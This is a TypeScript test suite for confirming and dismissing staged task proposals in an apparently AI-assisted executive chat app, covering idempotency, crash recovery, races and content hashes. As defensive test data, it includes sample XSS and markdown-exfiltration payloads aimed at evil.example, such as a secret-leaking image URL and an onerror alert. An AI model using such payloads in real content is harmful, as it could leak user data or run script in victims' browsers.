import { readFileSync } from "node:fs";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

vi.mock("@/lib/supabase-admin", () => ({ getSupabaseAdmin: vi.fn() }));

import { MarkdownBody } from "@/components/MarkdownBody";
import { proposalContentHash, type ProposalRow } from "@/lib/exec/chat-store";
import { neutralizeTaskText } from "@/lib/exec/chat/answer";
import { principalFromRows } from "@/lib/exec/principal";
import { confirmProposal, dismissProposal, newTaskId } from "@/lib/exec/proposals";
import { getSupabaseAdmin } from "@/lib/supabase-admin";

import { createChatFakeDb, type ChatFakeDb, type ChatFakeRequest, type Row } from "./__tests__/fake-chat-store-db";

// Staged tasks: confirm and dismiss (P5b contract §3.17, C22, C23, C42, C43; tests 85, 86, 119). The REAL
// proposals.ts and chat-store.ts (and turn.ts's proposalViewFor) run against Area A's in-memory Supabase stand-in;
// the tasks table refuses a second row with the same id (its primary key) and every proposal row is checked
// against §2.1's CHECKs after each test.

const principal = principalFromRows(
  { id: "ep_owner", user_id: "u_owner", enabled: true, mail_account_ids: [], slack_team_id: null, slack_user_id: null },
  { id: "u_owner", email: "owner@scaledai.org", name: "Mitchell", work_timezone: "America/New_York" },
  null
)!;
const NOW = new Date("2026-11-07T15:00:00.000Z");
const PID = `etp_${"1".repeat(32)}`;
const CONV = `ecv_${"a".repeat(32)}`;
const TURN = `ect_${"b".repeat(32)}`;
const AMSG = `ecm_${"d".repeat(32)}`;
const UMSG = `ecm_${"c".repeat(32)}`;
const OLD_TASK = "t_mhmh1234_abcde";

/** DD's POST /api/tasks row keys (src/app/api/tasks/route.ts:214-249), in its order. */
const DD_TASK_KEYS = [
  "id", "title", "description", "status", "priority", "estimated_hours", "actual_hours", "tags", "department_id", "assignee_id", "creator_id",
  "project_id", "due_date", "inactive_flag", "last_activity_at", "created_at", "blocks_task_ids", "client_name", "website", "client_email",
  "client_folder_url", "staging_server", "markup_link", "hosting_access", "missive_thread_url", "custom", "media_urls"
];
const DD_ACTIVITY_KEYS = ["id", "task_id", "user_id", "action", "detail"];

/** §3.19.6's hostile answer, as a staged task's text. */
const HOSTILE =
  "Check ![x](https://evil.example/p.png?d=secret) and [click](https://evil.example) now.\n" +
  "<img src=x onerror=alert(1)>\n" +
  "See https://evil.example/leak?d=secret and www.evil.example/x [r999]\n\n" +
  "[ref]: https://evil.example/def\n" +
  "password: hunter2";

function proposal(over: Row = {}): Row {
  return {
    id: PID, principal_id: principal.id, conversation_id: CONV, message_id: AMSG, status: "pending",
    title: "Fix the contact form", description: "The form drops messages sent after 5 pm.", assignee_user_id: "u_ann", assignee_name: "Ann Lee",
    department_id: "d_web", due_on: "2026-11-10", due_at: "2026-11-10T22:00:00+00:00", client_name: "Acme Dental", priority: "high",
    task_id: null, decided_at: null, redacted_at: null, created_at: "2026-11-07T14:00:00+00:00", updated_at: "2026-11-07T14:00:00+00:00",
    expires_at: "2026-11-14T14:00:00+00:00", ...over
  };
}

function message(id: string, role: "user" | "assistant", over: Row = {}): Row {
  return {
    id, principal_id: principal.id, conversation_id: CONV, turn_id: TURN, role, status: "complete", status_reason: null, text: "x",
    recommendations: "", context: null, sources: [], cards: role === "assistant" ? [{ kind: "task_proposal", id: PID }] : [],
    consulted_email_thread_ids: [], consulted_client_ids: [], consulted_dd_text: false, created_at: "2026-11-07T14:00:00+00:00",
    finished_at: "2026-11-07T14:00:05+00:00", redacted_at: null, ...over
  };
}

const camel = (r: Row): Pick<ProposalRow, "title" | "description" | "assigneeUserId" | "departmentId" | "clientName" | "dueAt" | "priority"> => ({
  title: r.title as string, description: r.description as string, assigneeUserId: r.assignee_user_id as string | null,
  departmentId: r.department_id as string | null, clientName: r.client_name as string | null, dueAt: r.due_at as string | null,
  priority: r.priority as ProposalRow["priority"]
});
const hashOf = (r: Row) => proposalContentHash(camel(r));

let db: ChatFakeDb;
let failHook: ((r: ChatFakeRequest) => { code: string; message: string } | null | undefined) | null = null;

function setup(opts: { proposals?: Row[]; tasks?: Row[]; activity?: Row[]; users?: Row[]; messages?: Row[] } = {}) {
  db = createChatFakeDb({
    tables: {
      exec_task_proposals: opts.proposals ?? [proposal()],
      exec_messages: opts.messages ?? [message(UMSG, "user"), message(AMSG, "assistant", { consulted_email_thread_ids: ["th_1"] })],
      departments: [{ id: "d_web", name: "Website", head_user_id: null }],
      users: opts.users ?? [{ id: "u_ann", name: "Ann Lee" }, { id: "u_owner", name: "Mitchell" }],
      tasks: opts.tasks ?? [],
      activity_logs: opts.activity ?? []
    },
    fail: (r) => {
      const forced = failHook?.(r);
      if (forced) return forced;
      // tasks.id is the primary key.
      if (r.kind === "insert" && r.target === "tasks" && db.tables.tasks.some((t) => t.id === (r.payload as Row).id)) {
        return { code: "23505", message: 'duplicate key value violates unique constraint "tasks_pkey"' };
      }
      return null;
    }
  });
  vi.mocked(getSupabaseAdmin).mockReturnValue(db.client as never);
  return db;
}

const row = () => db.tables.exec_task_proposals.find((r) => r.id === PID)!;
const writes = () => db.requests.filter((r) => r.kind === "insert" || r.kind === "update" || r.kind === "delete" || r.kind === "rpc");
const confirm = (hash = hashOf(row()), now = NOW) => confirmProposal(principal, PID, now, { contentHash: hash });

/** §2.1's exec_task_proposals CHECKs. */
function checkProblems(r: Row): string[] {
  const p: string[] = [];
  const s = r.status;
  const ok =
    (s === "pending" && r.task_id === null && r.decided_at === null) ||
    (s === "confirming" && r.task_id !== null && r.decided_at === null) ||
    (s === "confirmed" && r.task_id !== null && r.decided_at !== null) ||
    ((s === "dismissed" || s === "withdrawn") && r.task_id === null && r.decided_at !== null);
  if (!ok) p.push(`state ${String(s)}`);
  if (s === "withdrawn" && r.redacted_at === null) p.push("withdrawn without redacted_at");
  if (r.redacted_at !== null && !(r.title === "[Removed]" && r.description === "")) p.push("redacted with content");
  return p;
}

beforeEach(() => {
  vi.useFakeTimers({ toFake: ["Date"] });
  vi.setSystemTime(NOW);
  failHook = null;
  vi.spyOn(console, "warn").mockImplementation(() => undefined);
  setup();
});
afterEach(() => {
  for (const r of db.tables.exec_task_proposals) expect(checkProblems(r)).toEqual([]);
  vi.useRealTimers();
});

describe("newTaskId", () => {
  it("DD's format: t_ + epoch ms base36 + _ + 5 base36 characters", () => {
    const ids = new Set<string>();
    for (let i = 0; i < 200; i++) {
      const id = newTaskId(NOW);
      expect(id).toMatch(new RegExp(`^t_${NOW.getTime().toString(36)}_[0-9a-z]{5}$`));
      ids.add(id);
    }
    expect(ids.size).toBeGreaterThan(190);
  });

  it("the source draws from node:crypto, never Math.random", () => {
    const src = readFileSync("src/lib/exec/proposals.ts", "utf8");
    expect(src).toMatch(/from "node:crypto"/);
    expect(src).not.toMatch(/Math\.random\s*\(/);
  });
});

describe("confirm (test 85)", () => {
  it("pending → confirmed: one task with DD's key set, creator = Mitchell, DD's activity strings, nothing naming the feature", async () => {
    const result = await confirm();
    expect(result).toEqual({ kind: "confirmed", taskId: expect.stringMatching(/^t_[0-9a-z]+_[0-9a-z]{5}$/) });
    const taskId = (result as { taskId: string }).taskId;

    expect(db.tables.tasks).toHaveLength(1);
    const task = db.tables.tasks[0];
    expect(Object.keys(task)).toEqual(DD_TASK_KEYS);
    expect(task).toEqual({
      id: taskId, title: "Fix the contact form", description: "The form drops messages sent after 5 pm.", status: "pending", priority: "high",
      estimated_hours: 2, actual_hours: 0, tags: [], department_id: "d_web", assignee_id: "u_ann", creator_id: "u_owner", project_id: null,
      due_date: "2026-11-10T22:00:00.000Z", inactive_flag: false, last_activity_at: NOW.toISOString(), created_at: NOW.toISOString(),
      blocks_task_ids: [], client_name: "Acme Dental", website: null, client_email: null, client_folder_url: null, staging_server: null,
      markup_link: null, hosting_access: null, missive_thread_url: null, custom: {}, media_urls: []
    });

    expect(db.tables.activity_logs).toHaveLength(1);
    const activity = db.tables.activity_logs[0];
    expect(Object.keys(activity)).toEqual(DD_ACTIVITY_KEYS);
    expect(activity).toEqual({ id: expect.stringMatching(/^a_[0-9a-z]+_[0-9a-z]{5}$/), task_id: taskId, user_id: "u_owner", action: "created", detail: "Assigned to Ann Lee" });

    // Rule 14: nothing he didn't write names the feature.
    for (const v of [...Object.values(task), ...Object.values(activity)]) expect(JSON.stringify(v)).not.toMatch(/assistant|executive|exec\b/i);
    expect(row()).toMatchObject({ status: "confirmed", task_id: taskId, decided_at: NOW.toISOString() });
    // C22: the only writes are the proposal, the task and its activity row (no notification, post or sync).
    expect(new Set(writes().map((w) => w.target))).toEqual(new Set(["exec_task_proposals", "tasks", "activity_logs"]));
  });

  it("the key set is DD's own: the fixture equals the keys of the row tasks/route.ts builds", () => {
    const src = readFileSync("src/app/api/tasks/route.ts", "utf8");
    const start = src.indexOf("const row = {");
    expect(start).toBeGreaterThan(0);
    const end = src.slice(start).search(/\r?\n {4}\};/);
    expect(end).toBeGreaterThan(0);
    const keys = [...src.slice(start, start + end).matchAll(/^ {6}([a-z_]+)(?::|,\r?$)/gm)].map((m) => m[1]);
    expect(keys).toEqual(DD_TASK_KEYS);
  });

  it("unassigned → 'Created (unassigned)'; a renamed assignee → his current name, as DD resolves it", async () => {
    setup({ proposals: [proposal({ assignee_user_id: null, assignee_name: null, department_id: null, due_on: null, due_at: null, client_name: null })] });
    await confirm();
    expect(db.tables.tasks[0]).toMatchObject({ assignee_id: null, department_id: null, due_date: null, client_name: null });
    expect(db.tables.activity_logs[0].detail).toBe("Created (unassigned)");

    setup({ users: [{ id: "u_ann", name: "Ann Lee-Smith" }] });
    await confirm();
    expect(db.tables.activity_logs[0].detail).toBe("Assigned to Ann Lee-Smith");
  });

  it("C42: the inserted title and description are neutralizeTaskText of the stored text; MarkdownBody renders them inert", async () => {
    setup({ proposals: [proposal({ title: "Two\nlines ![x](https://evil.example/t.png) <b>bold</b>", description: HOSTILE })] });
    await confirm();
    const task = db.tables.tasks[0];
    expect(task.title).toBe(neutralizeTaskText("Two\nlines ![x](https://evil.example/t.png) <b>bold</b>", "title").trim());
    expect(task.description).toBe(neutralizeTaskText(HOSTILE, "description").trim());
    expect(String(task.title)).not.toMatch(/[\r\n]|!\[|\]\(|<b>/);
    const html = renderToStaticMarkup(createElement(MarkdownBody, { content: String(task.description) }));
    expect(html).not.toMatch(/<img/i);
    expect(html).not.toMatch(/href=/i);
    expect(html).not.toMatch(/onerror/i);
    // The raw description would have rendered a link (the check above isn't vacuous).
    expect(renderToStaticMarkup(createElement(MarkdownBody, { content: HOSTILE }))).toMatch(/href=/);
  });

  it("security-1: a stored description holding any of the review's payloads is inserted inert (the confirm's own pass)", async () => {
    const BS = String.fromCharCode(92);
    const payloads = [
      "See [the report][x] now.\n\n[x]:\n//evil.example/phish",
      "See [the report][x] now.\n\n> [x]: https:evil.example/phish",
      "Look ![logo][p]\n\n[p]:\nhttps:evil.example/pixel.png",
      `See [report][a${BS}]b]\n\n[a${BS}]b]: //evil.example/x`,
      "See [a [b [c]] d](//evil.example/x)",
      "See [doc](//evil.example/((a)))",
      "Reply to bob@evil.example"
    ];
    for (const description of payloads) {
      expect(renderToStaticMarkup(createElement(MarkdownBody, { content: description })), description).toMatch(/<a[\s>]|<img[\s>]/);
      setup({ proposals: [proposal({ description })] });
      await confirm();
      const html = renderToStaticMarkup(createElement(MarkdownBody, { content: String(db.tables.tasks[0].description) }));
      expect(html, description).not.toMatch(/<a[\s>]|<img[\s>]/);
    }
  });

  it("an empty description is stored as null (DD's rule)", async () => {
    setup({ proposals: [proposal({ description: "" })] });
    await confirm();
    expect(db.tables.tasks[0].description).toBeNull();
  });

  it("a second confirm → the same task, one row (idempotent)", async () => {
    const first = await confirm();
    const before = writes().length;
    expect(await confirm()).toEqual(first);
    expect(db.tables.tasks).toHaveLength(1);
    expect(db.tables.activity_logs).toHaveLength(1);
    expect(writes()).toHaveLength(before);
  });

  it("two concurrent confirms → one task, one activity row", async () => {
    const hash = hashOf(row());
    const results = await Promise.all([confirm(hash), confirm(hash), confirm(hash)]);
    expect(db.tables.tasks).toHaveLength(1);
    expect(db.tables.activity_logs).toHaveLength(1);
    const taskId = db.tables.tasks[0].id;
    expect(results.some((r) => r.kind === "confirmed")).toBe(true);
    for (const r of results) expect(r.kind === "confirmed" ? r.taskId : r.kind).toBe(r.kind === "confirmed" ? taskId : "in_progress");
    expect(row()).toMatchObject({ status: "confirmed", task_id: taskId });
  });

  it("a crash after confirming (no task yet): the resume inserts once, with the reserved id", async () => {
    setup({ proposals: [proposal({ status: "confirming", task_id: OLD_TASK, updated_at: "2026-11-07T14:50:00+00:00" })] });
    expect(await confirm()).toEqual({ kind: "confirmed", taskId: OLD_TASK });
    expect(db.tables.tasks.map((t) => t.id)).toEqual([OLD_TASK]);
    expect(db.tables.activity_logs).toHaveLength(1);
    expect(await confirm()).toEqual({ kind: "confirmed", taskId: OLD_TASK });
    expect(db.tables.tasks).toHaveLength(1);
  });

  it("a crash after the task insert (no activity row): the resume confirms and writes the activity row once", async () => {
    setup({
      proposals: [proposal({ status: "confirming", task_id: OLD_TASK, updated_at: "2026-11-07T14:50:00+00:00" })],
      tasks: [{ id: OLD_TASK, title: "Fix the contact form" }]
    });
    expect(await confirm()).toEqual({ kind: "confirmed", taskId: OLD_TASK });
    expect(db.tables.tasks).toHaveLength(1);
    expect(db.tables.activity_logs).toEqual([expect.objectContaining({ task_id: OLD_TASK, action: "created", detail: "Assigned to Ann Lee" })]);
  });

  it("a crash after both rows: the resume only confirms (no second activity row)", async () => {
    setup({
      proposals: [proposal({ status: "confirming", task_id: OLD_TASK, updated_at: "2026-11-07T14:50:00+00:00" })],
      tasks: [{ id: OLD_TASK, title: "Fix the contact form" }],
      activity: [{ id: "a_x_aaaaa", task_id: OLD_TASK, user_id: "u_owner", action: "created", detail: "Assigned to Ann Lee" }]
    });
    expect(await confirm()).toEqual({ kind: "confirmed", taskId: OLD_TASK });
    expect(db.tables.activity_logs).toHaveLength(1);
  });

  it("a confirming row another request moved under 60 s ago → in_progress, nothing written", async () => {
    setup({ proposals: [proposal({ status: "confirming", task_id: OLD_TASK, updated_at: "2026-11-07T14:59:30+00:00" })] });
    expect(await confirm()).toEqual({ kind: "in_progress" });
    expect(writes()).toEqual([]);
  });

  it("a confirming row whose task another request already inserted (recent) → confirmed, its activity left to that request", async () => {
    setup({
      proposals: [proposal({ status: "confirming", task_id: OLD_TASK, updated_at: "2026-11-07T14:59:30+00:00" })],
      tasks: [{ id: OLD_TASK, title: "Fix the contact form" }]
    });
    expect(await confirm()).toEqual({ kind: "confirmed", taskId: OLD_TASK });
    expect(db.tables.activity_logs).toEqual([]);
  });

  it("an insert's unique violation on the id is treated as inserted", async () => {
    let forced = false;
    failHook = (r) => {
      if (r.kind === "insert" && r.target === "tasks" && !forced) {
        forced = true;
        return { code: "23505", message: 'duplicate key value violates unique constraint "tasks_pkey"' };
      }
      return null;
    };
    const result = await confirm();
    expect(result.kind).toBe("confirmed");
    expect(forced).toBe(true);
    expect(row()).toMatchObject({ status: "confirmed", task_id: (result as { taskId: string }).taskId });
    expect(db.tables.activity_logs).toHaveLength(1);
  });

  it("any other insert error throws (the route answers 503); the row stays confirming for a resume", async () => {
    failHook = (r) => (r.kind === "insert" && r.target === "tasks" ? { code: "23503", message: 'violates foreign key "SECRET"' } : null);
    const err = await confirm().catch((e: unknown) => e);
    expect(err).toBeInstanceOf(Error);
    expect(String((err as Error).message)).not.toContain("SECRET");
    expect(row().status).toBe("confirming");
  });

  it("an activity row that can't be written is logged by id and doesn't fail the confirm (TR B12)", async () => {
    failHook = (r) => (r.kind === "insert" && r.target === "activity_logs" ? { code: "42501", message: "denied" } : null);
    expect((await confirm()).kind).toBe("confirmed");
    expect(JSON.stringify(vi.mocked(console.warn).mock.calls)).toMatch(new RegExp(PID));
    expect(JSON.stringify(vi.mocked(console.warn).mock.calls)).not.toMatch(/contact form|Ann/);
  });

  it("expired → expired; dismissed / withdrawn → not_pending; nothing written", async () => {
    setup({ proposals: [proposal({ expires_at: NOW.toISOString() })] });
    expect(await confirm()).toEqual({ kind: "expired" });
    expect(writes()).toEqual([]);
    setup({ proposals: [proposal({ status: "dismissed", decided_at: "2026-11-07T14:30:00+00:00" })] });
    expect(await confirm()).toEqual({ kind: "not_pending", status: "dismissed" });
    setup({ proposals: [proposal({ status: "withdrawn", decided_at: "2026-11-07T14:30:00+00:00", redacted_at: "2026-11-07T14:30:00+00:00", title: "[Removed]", description: "" })] });
    expect(await confirm()).toEqual({ kind: "not_pending", status: "withdrawn" });
    expect(writes()).toEqual([]);
  });

  it("the assignee no longer a user → assignee_unavailable, nothing written", async () => {
    setup({ users: [{ id: "u_owner", name: "Mitchell" }] });
    expect(await confirm()).toEqual({ kind: "assignee_unavailable" });
    expect(writes()).toEqual([]);
    expect(db.tables.tasks).toEqual([]);
  });

  it("not found: another principal's proposal, an unknown id, a malformed id", async () => {
    setup({ proposals: [proposal({ principal_id: "ep_other" })] });
    expect(await confirm(hashOf(proposal()))).toEqual({ kind: "not_found" });
    expect(await confirmProposal(principal, `etp_${"9".repeat(32)}`, NOW, { contentHash: "0".repeat(64) })).toEqual({ kind: "not_found" });
    expect(await confirmProposal(principal, "etp_bad", NOW, { contentHash: "0".repeat(64) })).toEqual({ kind: "not_found" });
    expect(writes()).toEqual([]);
  });

  it("a redaction that lands after his click read the row: confirming → withdrawn, nothing inserted", async () => {
    let selects = 0;
    failHook = (r) => {
      if (r.kind === "select" && r.target === "exec_task_proposals" && ++selects === 2) {
        // exec_chat_redact_threads on a confirming row: status kept, content cleared, redacted_at set (C20).
        Object.assign(row(), { title: "[Removed]", description: "", redacted_at: NOW.toISOString() });
      }
      return null;
    };
    expect(await confirm()).toEqual({ kind: "not_pending", status: "withdrawn" });
    expect(db.tables.tasks).toEqual([]);
    expect(row()).toMatchObject({ status: "withdrawn", task_id: null, decided_at: NOW.toISOString() });
  });

  it("a stale confirming row redacted since (the current hash) → withdrawn, nothing inserted", async () => {
    setup({ proposals: [proposal({ status: "confirming", task_id: OLD_TASK, updated_at: "2026-11-07T14:50:00+00:00", title: "[Removed]", description: "", redacted_at: "2026-11-07T14:55:00+00:00" })] });
    expect(await confirm()).toEqual({ kind: "not_pending", status: "withdrawn" });
    expect(db.tables.tasks).toEqual([]);
  });
});

describe("the card's content hash (tests 85, 119; C23, C43)", () => {
  it("a hash computed before a redaction cleared the row → changed with the current proposal, nothing inserted", async () => {
    const shown = proposal();
    const before = hashOf(shown);
    setup({ proposals: [proposal({ status: "confirming", task_id: OLD_TASK, updated_at: "2026-11-07T14:50:00+00:00", title: "[Removed]", description: "", redacted_at: "2026-11-07T14:55:00+00:00" })] });
    const result = await confirm(before);
    expect(result.kind).toBe("changed");
    const view = (result as Extract<typeof result, { kind: "changed" }>).proposal;
    expect(view).toMatchObject({ id: PID, status: "confirming", title: "[Removed]", description: "", redacted: true, departmentName: "Website", privacyNotice: true });
    // ProposalView.contentHash is proposalContentHash of the stored row.
    expect(view.contentHash).toBe(hashOf(row()));
    expect(view.contentHash).not.toBe(before);
    expect(db.tables.tasks).toEqual([]);
    expect(writes()).toEqual([]);
  });

  it("a hash that isn't the row's (a stale card) → changed, nothing written; the current hash → confirmed", async () => {
    const r = await confirm("f".repeat(64));
    expect(r.kind).toBe("changed");
    expect((r as Extract<typeof r, { kind: "changed" }>).proposal).toMatchObject({ status: "pending", title: "Fix the contact form", contentHash: hashOf(row()) });
    expect(writes()).toEqual([]);
    for (const bad of ["", "F".repeat(64), "abc"]) expect((await confirm(bad)).kind).toBe("changed");
    expect((await confirm(hashOf(row()))).kind).toBe("confirmed");
  });

  it("the hash covers each of the seven fields", async () => {
    const base = hashOf(proposal());
    for (const [k, v] of [["title", "Other"], ["description", "Other"], ["assignee_user_id", "u_bob"], ["department_id", "d_seo"], ["client_name", "Other"], ["due_at", "2026-11-11T22:00:00+00:00"], ["priority", "low"]] as const) {
      expect(hashOf(proposal({ [k]: v }))).not.toBe(base);
    }
  });
});

describe("dismiss (test 86)", () => {
  it("pending → dismissed (decided now, no task)", async () => {
    expect(await dismissProposal(principal, PID, NOW)).toEqual({ kind: "dismissed" });
    expect(row()).toMatchObject({ status: "dismissed", task_id: null, decided_at: NOW.toISOString() });
    expect(db.tables.tasks).toEqual([]);
  });

  it("a pending proposal past its expiry can still be set aside", async () => {
    setup({ proposals: [proposal({ expires_at: "2026-11-07T14:00:00+00:00" })] });
    expect(await dismissProposal(principal, PID, NOW)).toEqual({ kind: "dismissed" });
  });

  it.each([
    ["confirming", { status: "confirming", task_id: OLD_TASK }],
    ["confirmed", { status: "confirmed", task_id: OLD_TASK, decided_at: "2026-11-07T14:30:00+00:00" }],
    ["dismissed", { status: "dismissed", decided_at: "2026-11-07T14:30:00+00:00" }],
    ["withdrawn", { status: "withdrawn", decided_at: "2026-11-07T14:30:00+00:00", redacted_at: "2026-11-07T14:30:00+00:00", title: "[Removed]", description: "" }]
  ])("%s → not_pending with its status, nothing written", async (status, over) => {
    setup({ proposals: [proposal(over)] });
    // ui-8: a confirmed row names its task, so the card can link it.
    expect(await dismissProposal(principal, PID, NOW)).toEqual(status === "confirmed" ? { kind: "not_pending", status, taskId: OLD_TASK } : { kind: "not_pending", status });
    expect(writes()).toEqual([]);
  });

  it("not found: unknown, another principal's, malformed", async () => {
    setup({ proposals: [proposal({ principal_id: "ep_other" })] });
    expect(await dismissProposal(principal, PID, NOW)).toEqual({ kind: "not_found" });
    expect(await dismissProposal(principal, "etp_x", NOW)).toEqual({ kind: "not_found" });
  });

  it("a dismiss racing a confirm: exactly one wins", async () => {
    const [d, c] = await Promise.all([dismissProposal(principal, PID, NOW), confirm(hashOf(row()))]);
    const outcomes = [d.kind, c.kind].sort();
    if (row().status === "dismissed") {
      expect(d.kind).toBe("dismissed");
      expect(db.tables.tasks).toEqual([]);
    } else {
      expect(row().status).toBe("confirmed");
      expect(c.kind).toBe("confirmed");
      expect(d).toEqual({ kind: "not_pending", status: expect.any(String) });
    }
    expect(outcomes).toHaveLength(2);
  });
});
